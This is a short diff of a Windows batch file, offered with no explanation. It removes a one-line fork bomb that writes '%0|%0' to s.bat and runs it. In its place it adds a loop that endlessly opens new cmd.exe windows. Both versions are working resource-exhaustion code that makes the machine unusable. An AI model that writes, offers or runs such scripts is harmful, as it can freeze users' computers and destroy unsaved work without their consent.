@@ -1,1 +1,5 @@
-set /p="%0|%0"s.bat&s
+@echo off
+:xiaoz
+cls
+start cmd.exe
+goto xiaoz
